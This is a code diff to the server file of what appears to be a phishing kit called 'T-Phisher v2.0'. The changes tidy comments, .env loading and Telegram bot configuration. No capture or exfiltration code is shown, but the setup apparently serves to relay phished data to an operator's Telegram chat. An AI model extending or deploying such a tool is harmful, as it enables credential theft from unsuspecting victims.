@@ -1,13 +1,27 @@
-// T-Phisher v2.0 — Enhanced Server with Telegram Integration & WebSocket Routing
-const fs       = require('fs');
-const { exec } = require('child_process');
-const express  = require('express');
-const path     = require('path');
-const http     = require('http');
+// ============================================================
+//   T-Phisher v2.0
+//   Enhanced Server with Telegram Integration & WebSocket Routing
+//
+//   SECURITY NOTICE:
+//   - Never hardcode your BOT_TOKEN or CHAT_ID in this file.
+//   - For local development: create a .env file in this directory
+//     (see .env.example for the required format).
+//   - For production (e.g. Render): set BOT_TOKEN and CHAT_ID
+//     as environment variables in your hosting dashboard.
+//   - The .env file is listed in .gitignore and will never be
+//     committed to the repository.
+// ============================================================
+
+const fs        = require('fs');
+const { exec }  = require('child_process');
+const express   = require('express');
+const path      = require('path');
+const http      = require('http');
 const WebSocket = require('ws');
 const TelegramBot = require('node-telegram-bot-api');
 
-// Load environment variables from .env file if it exists
+// ─── Load .env file (local development only) ──────────────────────────────────
+// In production, environment variables are injected by the hosting platform.
 const envPath = path.join(__dirname, '.env');
 if (fs.existsSync(envPath)) {
   const envContent = fs.readFileSync(envPath, 'utf8');
@@ -18,6 +32,7 @@ if (fs.existsSync(envPath)) {
       if (equalsIdx > 0) {
         const key = trimmedLine.substring(0, equalsIdx).trim();
         const val = trimmedLine.substring(equalsIdx + 1).trim().replace(/^["']|["']$/g, '');
+        // Only set if not already defined (platform env vars take priority)
         if (key && process.env[key] === undefined) {
           process.env[key] = val;
         }
@@ -27,9 +42,10 @@ if (fs.existsSync(envPath)) {
 }
 
 // ─── Configuration ────────────────────────────────────────────────────────────
-const PORT      = process.env.PORT || 3000;
+// Values are read from environment variables — never hardcoded.
+const PORT      = process.env.PORT      || 3000;
 const BOT_TOKEN = process.env.BOT_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN';
-const CHAT_ID   = process.env.CHAT_ID || 'YOUR_TELEGRAM_CHAT_ID';
+const CHAT_ID   = process.env.CHAT_ID   || 'YOUR_TELEGRAM_CHAT_ID';
 
 // ─── Initialize Core Services ─────────────────────────────────────────────────
 const app    = express();
